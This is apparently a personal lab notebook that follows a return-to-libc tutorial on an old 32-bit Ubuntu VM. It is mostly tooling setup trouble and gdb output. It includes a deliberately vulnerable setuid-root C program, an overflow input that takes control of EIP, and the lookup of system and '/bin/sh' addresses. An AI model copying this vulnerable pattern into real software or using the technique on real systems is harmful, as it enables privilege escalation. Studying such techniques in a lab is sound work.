## RETURN TO LIBC ON MODERN 32 BIT AND 64 BIT LINUX 

### Sources

* https://www.ret2rop.com/2018/08/return-to-libc.html
* http://visualgdb.com/gdbreference/commands/x
* https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

### Using Uunbtu 10.10

```

trying to replicate the example. looking for i386 

http://old-releases.ubuntu.com/releases/10.10/

 us.archive.ubuntu.com and security.ubuntu.com in /etc/apt/sources.list with old-releases.ubuntu.com

Linux ubuntu 2.6.35-19-generic-pae #28-Ubuntu SMP Sun Aug 29 08:17:04 UTC 2010 i686 GNU/Linux

us.archive.ubuntu.com
security.ubuntu.com
old-releases.ubuntu.com

/etc/apt/sources.list

sudo cp /etc/apt/sources.list /etc/apt/sources.list-bak

sudo sed -i 's/us.archive/old-releases/g' /etc/apt/sources.list
sudo sed -i 's/security/old-releases/g' /etc/apt/sources.list

https://askubuntu.com/questions/32064/failed-to-fetch-http-in-archive-ubuntu-com-ubuntu-dists-maverick-release

sudo apt-get upgrade
Need to get 76.7MB of archives.
After this operation, 274kB of additional disk space will be used.
Do you want to continue [Y/n]? 
Get:1 http://old-releases.ubuntu.com/ubuntu/ maverick-updates/main libpam-modules i386 1.1.1-4ubuntu2.4 [336kB]
Get:2 http://old-releases.ubuntu.com/ubuntu/ maverick/main base-files i386 5.0.0ubuntu23 [79.3kB]
Get:3 http://old-releases.ubuntu.com/ubuntu/ maverick-updates/main libc-bin i386 2.12.1-0ubuntu10.4 [740kB]
Get:4 http://old-releases.ubuntu.com/ubuntu/ maverick-updates/main libc6 i386 2.12.1-0ubuntu10.4 [3,929kB]
Get:5 http://old-releases.ubuntu.com/ubuntu/ maverick/main gcc-4.5-base i386 4.5.1-7ubuntu2 [122kB]
0 added, 1 removed; done.
Running hooks in /etc/ca-certificates/update.d....done.
Setting up python-apt (0.7.96.1ubuntu11.2) ...
Setting up command-not-found-data (0.2.40ubuntu15) ...
Setting up gcc-4.4-base (4.4.4-14ubuntu5.1) ...
Setting up cpp-4.4 (4.4.4-14ubuntu5.1) ...
Setting up libpixman-1-0 (0.18.4-1) ...
Setting up libcairo2 (1.10.0-1ubuntu3) ...
Setting up libffi5 (3.0.9-2ubuntu2) ...
Setting up libgc1c2 (1:6.8-1.2ubuntu2) ...

Processing triggers for libc-bin ...
ldconfig deferred processing now taking place
Processing triggers for python-support ...
Processing triggers for python-central ...
Processing triggers for initramfs-tools ...
update-initramfs: Generating /boot/initrd.img-2.6.35-19-generic-pae
ubuntu@ubuntu:~$ 

sudo apt-get update
W: Failed to fetch http://old-releases.ubuntu.com/ubuntu/dists/maverick-old-releases/restricted/source/Sources.gz  404  Not Found [IP: 2001:67c:1360:8001::25 80]
W: Failed to fetch http://old-releases.ubuntu.com/ubuntu/dists/maverick-old-releases/universe/source/Sources.gz  404  Not Found [IP: 2001:67c:1360:8001::25 80]

sudo apt-get update
sudo apt-get upgrade
sudo apt-get install [package-name]


ubuntu@ubuntu:~$ sudo apt-get install gcc
Reading package lists... Done
Building dependency tree       
Reading state information... Done
gcc is already the newest version.
0 upgraded, 0 newly installed, 0 to remove and 4 not upgraded.
ubuntu@ubuntu:~$ 

ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space 
0

#include<stdio.h> 
#include<string.h> 
int main(int argc, char *argv[]) 
{ 
  char buf[100]; 
  strcpy(buf,argv[1]); 
  printf("Input was: %s\n",buf); 
  return 0; 
}

gcc buf.c -o buf -fno-stack-protector
sudo chown root buf
sudo chmod +s buf

objdump -p buf

buf:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000100 memsz 0x00000100 flags r-x
  INTERP off    0x00000134 vaddr 0x08048134 paddr 0x08048134 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x00000514 memsz 0x00000514 flags r-x
    LOAD off    0x00000f14 vaddr 0x08049f14 paddr 0x08049f14 align 2**12
         filesz 0x00000104 memsz 0x0000010c flags rw-
 DYNAMIC off    0x00000f28 vaddr 0x08049f28 paddr 0x08049f28 align 2**2
         filesz 0x000000c8 memsz 0x000000c8 flags rw-
    NOTE off    0x00000148 vaddr 0x08048148 paddr 0x08048148 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-  <=================== not executable
   RELRO off    0x00000f14 vaddr 0x08049f14 paddr 0x08049f14 align 2**0
         filesz 0x000000ec memsz 0x000000ec flags r--

Dynamic Section:
  NEEDED               libc.so.6
  INIT                 0x080482b4
  FINI                 0x080484dc
  GNU_HASH             0x0804818c
  STRTAB               0x0804820c
  SYMTAB               0x080481ac
  STRSZ                0x00000053
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000020
  PLTREL               0x00000011
  JMPREL               0x08048294
  REL                  0x0804828c
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x0804826c
  VERNEEDNUM           0x00000001
  VERSYM               0x08048260

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0

ubuntu@ubuntu:~$ 

sudo apt-get install gdb

now back to https://www.ret2rop.com/2018/08/return-to-libc.html

(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:  push   %ebp
   0x080483f5 <+1>:  mov    %esp,%ebp
   0x080483f7 <+3>:  and    $0xfffffff0,%esp
   0x080483fa <+6>:  add    $0xffffff80,%esp
   0x080483fd <+9>:  mov    0xc(%ebp),%eax
   0x08048400 <+12>: add    $0x4,%eax
   0x08048403 <+15>: mov    (%eax),%eax
   0x08048405 <+17>: mov    %eax,0x4(%esp)
   0x08048409 <+21>: lea    0x1c(%esp),%eax
   0x0804840d <+25>: mov    %eax,(%esp)
   0x08048410 <+28>: call   0x8048314 <strcpy@plt>
   0x08048415 <+33>: mov    $0x8048500,%eax
   0x0804841a <+38>: lea    0x1c(%esp),%edx
   0x0804841e <+42>: mov    %edx,0x4(%esp)
   0x08048422 <+46>: mov    %eax,(%esp)
   0x08048425 <+49>: call   0x8048324 <printf@plt>
   0x0804842a <+54>: mov    $0x0,%eax
   0x0804842f <+59>: leave  
   0x08048430 <+60>: ret    
End of assembler dump.

(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:  push   ebp
   0x080483f5 <+1>:  mov    ebp,esp
   0x080483f7 <+3>:  and    esp,0xfffffff0
   0x080483fa <+6>:  add    esp,0xffffff80
   0x080483fd <+9>:  mov    eax,DWORD PTR [ebp+0xc]
   0x08048400 <+12>: add    eax,0x4
   0x08048403 <+15>: mov    eax,DWORD PTR [eax]
   0x08048405 <+17>: mov    DWORD PTR [esp+0x4],eax
   0x08048409 <+21>: lea    eax,[esp+0x1c]
   0x0804840d <+25>: mov    DWORD PTR [esp],eax
   0x08048410 <+28>: call   0x8048314 <strcpy@plt>
   0x08048415 <+33>: mov    eax,0x8048500
   0x0804841a <+38>: lea    edx,[esp+0x1c]
   0x0804841e <+42>: mov    DWORD PTR [esp+0x4],edx
   0x08048422 <+46>: mov    DWORD PTR [esp],eax
   0x08048425 <+49>: call   0x8048324 <printf@plt>
   0x0804842a <+54>: mov    eax,0x0
   0x0804842f <+59>: leave  
   0x08048430 <+60>: ret    
End of assembler dump.
(gdb) 


(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/ubuntu/buf 

Breakpoint 1, 0x080483f7 in main ()
(gdb) p getpid()
$1 = 23006
(gdb) 


shell cat /proc/$pid/maps or info proc maps

shell cat /proc/23006/maps or info proc maps

(gdb) shell cat /proc/23006/maps or info proc maps
08048000-08049000 r-xp 00000000 08:01 389595     /home/ubuntu/buf
08049000-0804a000 r--p 00000000 08:01 389595     /home/ubuntu/buf
0804a000-0804b000 rw-p 00001000 08:01 389595     /home/ubuntu/buf
b7e7d000-b7e7e000 rw-p 00000000 00:00 0 
b7e7e000-b7fd5000 r-xp 00000000 08:01 18618      /lib/libc-2.12.1.so
b7fd5000-b7fd7000 r--p 00157000 08:01 18618      /lib/libc-2.12.1.so
b7fd7000-b7fd8000 rw-p 00159000 08:01 18618      /lib/libc-2.12.1.so
b7fd8000-b7fdb000 rw-p 00000000 00:00 0 
b7fdf000-b7fe1000 rw-p 00000000 00:00 0 
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 18602      /lib/ld-2.12.1.so
b7ffe000-b7fff000 r--p 0001b000 08:01 18602      /lib/ld-2.12.1.so
b7fff000-b8000000 rw-p 0001c000 08:01 18602      /lib/ld-2.12.1.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
cat: or: No such file or directory
cat: info: No such file or directory
cat: proc: No such file or directory
cat: maps: No such file or directory
(gdb) 


r $(python -c "print 'A'*112+'B'*8+'C'*8+'D'*8")

(gdb) r $(python -c "print 'A'*112+'B'*8+'C'*8+'D'*8")
Starting program: /home/ubuntu/buf $(python -c "print 'A'*112+'B'*8+'C'*8+'D'*8")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 


sudo apt-get install git
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"

ubuntu@ubuntu:~$ wget https://github.com/longld/peda/archive/master.zip
--2019-06-19 19:22:57--  https://github.com/longld/peda/archive/master.zip
Resolving github.com... 192.30.253.112
Connecting to github.com|192.30.253.112|:443... connected.
OpenSSL: error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
Unable to establish SSL connection.

ubuntu@ubuntu:~$ git --version
git version 1.7.1
ubuntu@ubuntu:~$ 

https://github.com/glennhickey/progressiveCactus/issues/93
git config --global --add http.sslVersion tlsv1.2


ubuntu@ubuntu:~$ sudo apt-get install curl
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  libcurl3
The following NEW packages will be installed:
  curl libcurl3
0 upgraded, 2 newly installed, 0 to remove and 4 not upgraded.
Need to get 497kB of archives.
After this operation, 868kB of additional disk space will be used.
Do you want to continue [Y/n]? 
Get:1 http://old-releases.ubuntu.com/ubuntu/ maverick-updates/main libcurl3 i386 7.21.0-1ubuntu1.3 [268kB]
Get:2 http://old-releases.ubuntu.com/ubuntu/ maverick-updates/main curl i386 7.21.0-1ubuntu1.3 [229kB]
Fetched 497kB in 2s (246kB/s)
Selecting previously deselected package libcurl3.
(Reading database ... 48115 files and directories currently installed.)
Unpacking libcurl3 (from .../libcurl3_7.21.0-1ubuntu1.3_i386.deb) ...
Selecting previously deselected package curl.
Unpacking curl (from .../curl_7.21.0-1ubuntu1.3_i386.deb) ...
Processing triggers for man-db ...
Setting up libcurl3 (7.21.0-1ubuntu1.3) ...
Setting up curl (7.21.0-1ubuntu1.3) ...
Processing triggers for libc-bin ...
ldconfig deferred processing now taking place
ubuntu@ubuntu:~$ 

ubuntu@ubuntu:~$ curl https://github.com/longld/peda/archive/master.zip
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$ 

ubuntu@ubuntu:~$  curl --version
curl 7.21.0 (i686-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18
Protocols: dict file ftp ftps http https imap imaps ldap ldaps pop3 pop3s rtsp smtp smtps telnet tftp 
Features: GSS-Negotiate IDN IPv6 Largefile NTLM SSL libz 
ubuntu@ubuntu:~$ 

old curl ssl error 
https://drjohnstechtalk.com/blog/2017/05/curl-showing-its-age-with-ssl-error/

ubuntu@ubuntu:~$ curl https://github.com/longld/peda/archive/master.zip
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$ curl -k https://github.com/longld/peda/archive/master.zip
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$  git config --global --add http.sslVersion tlsv1.2
ubuntu@ubuntu:~$  git config --global --add http.sslbackend openssl
ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ curl https://github.com/longld/peda/archive/master.zip
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$ git clone https://github.com/longld/peda.git ~/peda
Initialized empty Git repository in /home/ubuntu/peda/.git/
^C
ubuntu@ubuntu:~$ wget https://github.com/longld/peda/archive/master.zip
--2019-06-19 19:27:09--  https://github.com/longld/peda/archive/master.zip
Resolving github.com... 192.30.253.113
Connecting to github.com|192.30.253.113|:443... connected.
OpenSSL: error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
Unable to establish SSL connection.
ubuntu@ubuntu:~$ export GIT_CURL_VERBOSE=1
ubuntu@ubuntu:~$ curl https://github.com/longld/peda/archive/master.zip
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$  curl --version
curl 7.21.0 (i686-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18
Protocols: dict file ftp ftps http https imap imaps ldap ldaps pop3 pop3s rtsp smtp smtps telnet tftp 
Features: GSS-Negotiate IDN IPv6 Largefile NTLM SSL libz 
ubuntu@ubuntu:~$ curl ‐i ‐k https://julialang.org/
curl: (6) Couldn't resolve host '‐i'
curl: (6) Couldn't resolve host '‐k'
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$ curl ‐help
curl: (6) Couldn't resolve host '‐help'
ubuntu@ubuntu:~$ curl ‐‐tlsv1.2 ‐‐verbose ‐k https://askapache.com/
curl: (6) Couldn't resolve host '‐‐tlsv1.2'
curl: (6) Couldn't resolve host '‐‐verbose'
curl: (6) Couldn't resolve host '‐k'
curl: (35) error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
ubuntu@ubuntu:~$ openssl ciphers
DHE-RSA-AES256-SHA:DHE-DSS-AES256-SHA:AES256-SHA:EDH-RSA-DES-CBC3-SHA:EDH-DSS-DES-CBC3-SHA:DES-CBC3-SHA:DES-CBC3-MD5:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA:AES128-SHA:RC2-CBC-MD5:RC4-SHA:RC4-MD5:RC4-MD5:EDH-RSA-DES-CBC-SHA:EDH-DSS-DES-CBC-SHA:DES-CBC-SHA:DES-CBC-MD5:EXP-EDH-RSA-DES-CBC-SHA:EXP-EDH-DSS-DES-CBC-SHA:EXP-DES-CBC-SHA:EXP-RC2-CBC-MD5:EXP-RC2-CBC-MD5:EXP-RC4-MD5:EXP-RC4-MD5
ubuntu@ubuntu:~$ curl ‐v ‐k https://drjohnstechtalk.com/
curl: (6) Couldn't resolve host '‐v'
curl: (6) Couldn't resolve host '‐k'
 

ubuntu@ubuntu:~$ python --version
Python 2.6.6


$ scp ~/Downloads/peda-master.zip  ubuntu@192.168.0.38:/home/ubuntu

sudo apt-get install unzip

echo "source ~/peda-master/peda.py" >> ~/.gdbinit

This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Traceback (most recent call last):
  File "~/peda-master/peda.py", line 40, in <module>
  File "/home/ubuntu/peda-master/lib/shellcode.py", line 35
    return {k: six.b(v) for k, v in dict_.items()}
                          ^
SyntaxError: invalid syntax
buf: No such file or directory.
(gdb) q

rm /home/ubuntu/.gdbinit 

pede does not work
python doest work
curl doest work
openssl does not work

https://www.ret2rop.com/2018/08/return-to-libc.html

#include<stdlib.h>
void main()
{
system("/bin/sh");
}

shell.c

gcc shell.c -o shell -fno-stack-protector

(gdb) disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:  push   %ebp
   0x080483c5 <+1>:  mov    %esp,%ebp
   0x080483c7 <+3>:  and    $0xfffffff0,%esp
   0x080483ca <+6>:  sub    $0x10,%esp
   0x080483cd <+9>:  movl   $0x80484a0,(%esp)
   0x080483d4 <+16>: call   0x80482e4 <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:  push   ebp
   0x080483c5 <+1>:  mov    ebp,esp
   0x080483c7 <+3>:  and    esp,0xfffffff0
   0x080483ca <+6>:  sub    esp,0x10
   0x080483cd <+9>:  mov    DWORD PTR [esp],0x80484a0
   0x080483d4 <+16>: call   0x80482e4 <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.
(gdb) 

End of assembler dump.
(gdb) d
(gdb) b *main+16
Breakpoint 1 at 0x80483d4
(gdb) 

hard to live without peda 
sudo apt-get install  python3

ubuntu@ubuntu:~$ python3 --version
Python 3.1.2

 mv peda-master peda

 ubuntu@ubuntu:~$ mv peda-master peda
ubuntu@ubuntu:~$ echo "source ~/peda/peda.py" >> ~/.gdbinit
ubuntu@ubuntu:~$ gdb
GNU gdb (GDB) 7.2-ubuntu
Copyright (C) 2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Traceback (most recent call last):
  File "~/peda/peda.py", line 40, in <module>
  File "/home/ubuntu/peda/lib/shellcode.py", line 35
    return {k: six.b(v) for k, v in dict_.items()}
                          ^
SyntaxError: invalid syntax
(gdb) 

ubuntu@ubuntu:~$ python --version
Python 2.6.6
ubuntu@ubuntu:~$ alias python=python3
ubuntu@ubuntu:~$ python --version
Python 3.1.2
ubuntu@ubuntu:~$ 


Try: sudo apt-get install <selected package>
The program 'import' can be found in the following packages:
 * imagemagick
 * graphicsmagick-imagemagick-compat
Try: sudo apt-get install <selected package>
-bash: /home/ubuntu/peda/peda.py: line 23: syntax error near unexpected token `('
-bash: /home/ubuntu/peda/peda.py: line 23: `PEDAFILE = os.path.abspath(os.path.expanduser(__file__))'
ubuntu@ubuntu:~$ sudo apt-get install imagemagick graphicsmagick-imagemagick-compat
Reading package lists... Done
Building dependency tree       

sudo apt-get install imagemagick 


ubuntu@ubuntu:~$ source /home/ubuntu/peda/peda.py
from: can't read /var/mail/__future__
from: can't read /var/mail/__future__
from: can't read /var/mail/__future__
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
import: unable to open X server `' @ error/import.c/ImportImageCommand/362.
-bash: /home/ubuntu/peda/peda.py: line 23: syntax error near unexpected token `('
-bash: /home/ubuntu/peda/peda.py: line 23: `PEDAFILE = os.path.abspath(os.path.expanduser(__file__))'
ubuntu@ubuntu:~$ sudo apt-get install graphicsmagick-imagemagick-compat

sudo apt-get install graphicsmagick-imagemagick-compat

ubuntu@ubuntu:~$ source /home/ubuntu/peda/peda.py
from: can't read /var/mail/__future__
from: can't read /var/mail/__future__
from: can't read /var/mail/__future__
import import: Unable to open XServer ().
import import: Unable to open XServer ().
import import: Unable to open XServer ().
import import: Unable to open XServer ().
import import: Unable to open XServer ().'

rm ~/.gdbinit

(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:  push   ebp
   0x080483c5 <+1>:  mov    ebp,esp
   0x080483c7 <+3>:  and    esp,0xfffffff0
   0x080483ca <+6>:  sub    esp,0x10
   0x080483cd <+9>:  mov    DWORD PTR [esp],0x80484a0
   0x080483d4 <+16>: call   0x80482e4 <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.
(gdb) 


(gdb) b *main+16
Breakpoint 1 at 0x80483d4
(gdb) r
Starting program: /home/ubuntu/shell 

Breakpoint 1, 0x080483d4 in main ()
(gdb) i r
eax            0xbffff814  -1073743852
ecx            0x72395079  1916358777
edx            0x1   1
ebx            0xb7fd5ff4  -1208131596
esp            0xbffff750  0xbffff750
ebp            0xbffff768  0xbffff768
esi            0x0   0
edi            0x0   0
eip            0x80483d4   0x80483d4 <main+16>
eflags         0x286 [ PF SF IF ]
cs             0x73  115
ss             0x7b  123
ds             0x7b  123
es             0x7b  123
fs             0x0   0
gs             0x33  51
(gdb) 


(gdb) i f
Stack level 0, frame at 0xbffff770:
 eip = 0x80483d4 in main; saved eip 0xb7e93ce7
 Arglist at 0xbffff768, args: 
 Locals at 0xbffff768, Previous frame's sp is 0xbffff770'
 Saved registers:
  ebp at 0xbffff768, eip at 0xbffff76c
(gdb) disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:  push   ebp
   0x080483c5 <+1>:  mov    ebp,esp
   0x080483c7 <+3>:  and    esp,0xfffffff0
   0x080483ca <+6>:  sub    esp,0x10
   0x080483cd <+9>:  mov    DWORD PTR [esp],0x80484a0
=> 0x080483d4 <+16>: call   0x80482e4 <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.
(gdb) 


(gdb) x/s 0x80484a0
0x80484a0:   "/bin/sh"
(gdb) 


(gdb) x/s 0xbffff750
0xbffff750:  "\240\204\004\b\200\v\377\267\373\203\004\b\364_\375\267\360\203\004\b"
(gdb) x/s $esp
0xbffff750:  "\240\204\004\b\200\v\377\267\373\203\004\b\364_\375\267\360\203\004\b"
(gdb) 

(gdb) x/100x $sp
0xbffff750: 0xa0  0x84  0x04  0x08  0x80  0x0b  0xff  0xb7
0xbffff758: 0xfb  0x83  0x04  0x08  0xf4  0x5f  0xfd  0xb7
0xbffff760: 0xf0  0x83  0x04  0x08  0x00  0x00  0x00  0x00

(gdb) x/32xw $sp
0xbffff750: 0x080484a0  0xb7ff0b80  0x080483fb  0xb7fd5ff4
0xbffff760: 0x080483f0  0x00000000  0xbffff7e8  0xb7e93ce7
0xbffff770: 0x00000001  0xbffff814  0xbffff81c  0xb7fe0848
0xbffff780: 0xbffff86c  0xffffffff  0xb7ffeff4  0x0804822c
0xbffff790: 0x00000001  0xbffff7d0  0xb7ff0156  0xb7fffad0
0xbffff7a0: 0xb7fe0b28  0xb7fd5ff4  0x00000000  0x00000000
0xbffff7b0: 0xbffff7e8  0x5faee869  0x72395079  0x00000000
0xbffff7c0: 0x00000000  0x00000000  0x00000001  0x08048310
(gdb) 


https://stackoverflow.com/questions/7848771/how-can-one-see-content-of-stack-with-gdb

(gdb) bt
#0  0x080483d4 in main ()

(gdb) disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:  push   ebp
   0x080483c5 <+1>:  mov    ebp,esp
   0x080483c7 <+3>:  and    esp,0xfffffff0
   0x080483ca <+6>:  sub    esp,0x10
   0x080483cd <+9>:  mov    DWORD PTR [esp],0x80484a0
=> 0x080483d4 <+16>: call   0x80482e4 <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.

(gdb) si
0x080482e4 in system@plt ()

(gdb) disas 0x080482e4
Dump of assembler code for function system@plt:
=> 0x080482e4 <+0>:  jmp    DWORD PTR ds:0x804a004
   0x080482ea <+6>:  push   0x8
   0x080482ef <+11>: jmp    0x80482c4
End of assembler dump.

(gdb) disas 0x080482e4
Dump of assembler code for function system@plt:
   0x080482e4 <+0>:  jmp    DWORD PTR ds:0x804a004
=> 0x080482ea <+6>:  push   0x8
   0x080482ef <+11>: jmp    0x80482c4
End of assembler dump.



(gdb) r
Starting program: /home/ubuntu/shell 

Breakpoint 1, 0x080483d4 in main ()
(gdb) i f
Stack level 0, frame at 0xbffff770:
 eip = 0x80483d4 in main; saved eip 0xb7e93ce7
 Arglist at 0xbffff768, args: 
 Locals at 0xbffff768, Previous frames sp is 0xbffff770
 Saved registers:
  ebp at 0xbffff768, eip at 0xbffff76c
(gdb) x/32xw $sp
0xbffff750: 0x080484a0  0xb7ff0b80  0x080483fb  0xb7fd5ff4
0xbffff760: 0x080483f0  0x00000000  0xbffff7e8  0xb7e93ce7
0xbffff770: 0x00000001  0xbffff814  0xbffff81c  0xb7fe0848
0xbffff780: 0xbffff86c  0xffffffff  0xb7ffeff4  0x0804822c
0xbffff790: 0x00000001  0xbffff7d0  0xb7ff0156  0xb7fffad0
0xbffff7a0: 0xb7fe0b28  0xb7fd5ff4  0x00000000  0x00000000
0xbffff7b0: 0xbffff7e8  0xa7eb528e  0x8a7cea9e  0x00000000
0xbffff7c0: 0x00000000  0x00000000  0x00000001  0x08048310
(gdb) 

x/s 0x080484a0

(gdb) x/s 0x080484a0
0x80484a0:   "/bin/sh"
(gdb) x/s 0xb7ff0b80
0xb7ff0b80:  "U\211\345WV1\366S\350\376\212"
(gdb) 


(gdb) x/s 0x080483fb
0x80483fb <__libc_csu_init+11>:   "\201\303\371\033"
(gdb) 


(gdb) x/s 0xb7e93ce7
0xb7e93ce7 <__libc_start_main+231>:  "\211\004$\350\361\211\001"
(gdb) 


gdb-peda$ disas main
Dump of assembler code for function main:
   0x080483c4 <+0>: push   ebp
   0x080483c5 <+1>: mov    ebp,esp
   0x080483c7 <+3>: and    esp,0xfffffff0
   0x080483ca <+6>: sub    esp,0x10
   0x080483cd <+9>: mov    DWORD PTR [esp],0x80484a0
   0x080483d4 <+16>: call   0x80482ec <system@plt>
   0x080483d9 <+21>: leave  
   0x080483da <+22>: ret    
End of assembler dump.
gdb-peda$ b *main+16
Breakpoint 1 at 0x80483d4
gdb-peda$ r
Starting program: /home/archer/compiler_tests/sys 
[----------------------------------registers-----------------------------------]
EAX: 0xf7f98d98 --> 0xffffd0fc 
EBX: 0x0 
ECX: 0xb73f45c0 
EDX: 0xffffd084 --> 0x0 
ESI: 0xf7f96e28 --> 0x1ced30 
EDI: 0x0 
EBP: 0xffffd058 --> 0x0 
ESP: 0xffffd040 --> 0x80484a0 ("/bin/sh")
EIP: 0x80483d4 (<main+16>: call   0x80482ec <system@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80483c7 <main+3>: and    esp,0xfffffff0
   0x80483ca <main+6>: sub    esp,0x10
   0x80483cd <main+9>: mov    DWORD PTR [esp],0x80484a0
=> 0x80483d4 <main+16>: call   0x80482ec <system@plt>
   0x80483d9 <main+21>: leave  <=return address for function 'system'
   0x80483da <main+22>: ret    
   0x80483db: nop
   0x80483dc: nop
Guessed arguments:
arg[0]: 0x80484a0 ("/bin/sh")
[------------------------------------stack-------------------------------------]
0000| 0xffffd040 --> 0x80484a0 ("/bin/sh")
0004| 0xffffd044 --> 0x80481e4 --> 0x30 ('0')
0008| 0xffffd048 --> 0x80483fb (<__libc_csu_init+11>: add    ebx,0x1199)
0012| 0xffffd04c --> 0x0 
0016| 0xffffd050 --> 0xf7f96e28 --> 0x1ced30 
0020| 0xffffd054 --> 0xf7f96e28 --> 0x1ced30 
0024| 0xffffd058 --> 0x0 
0028| 0xffffd05c --> 0xf7de0793 (<__libc_start_main+243>: add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080483d4 in main ()

http://visualgdb.com/gdbreference/commands/x

x/d 0xb7ff0b80
0xb7ff0b80: 85

(gdb) x/5c 0xb7ff0b80
0xb7ff0b80: 85 'U'   -119 '\211' -27 '\345'  87 'W'   86 'V'
(gdb) x/s 0xb7ff0b80
0xb7ff0b80:  "U\211\345WV1\366S\350\376\212"

(gdb) x/5i 0x080483fb
   0x80483fb <__libc_csu_init+11>:  add    ebx,0x1bf9
   0x8048401 <__libc_csu_init+17>:  sub    esp,0x1c
   0x8048404 <__libc_csu_init+20>:  call   0x8048294 <_init>
   0x8048409 <__libc_csu_init+25>:  lea    edi,[ebx-0xe0]
   0x804840f <__libc_csu_init+31>:  lea    eax,[ebx-0xe0]
(gdb) x/s 0x080483fb
0x80483fb <__libc_csu_init+11>:   "\201\303\371\033"
(gdb) 

https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf

leave Set %rsp to %rbp, then pop top of stack into %rbp 

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7eb6680 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7eac6e0 <exit>
(gdb) 

ubuntu@ubuntu:~$ strings -t x /lib/libc.so.6 | grep "/bin/sh"
 135cda /bin/sh
ubuntu@ubuntu:~$ 

(gdb) p getpid()
$3 = 26601
(gdb) shell cat /proc/26601/maps
08048000-08049000 r-xp 00000000 08:01 389595     /home/ubuntu/buf
08049000-0804a000 r--p 00000000 08:01 389595     /home/ubuntu/buf
0804a000-0804b000 rw-p 00001000 08:01 389595     /home/ubuntu/buf
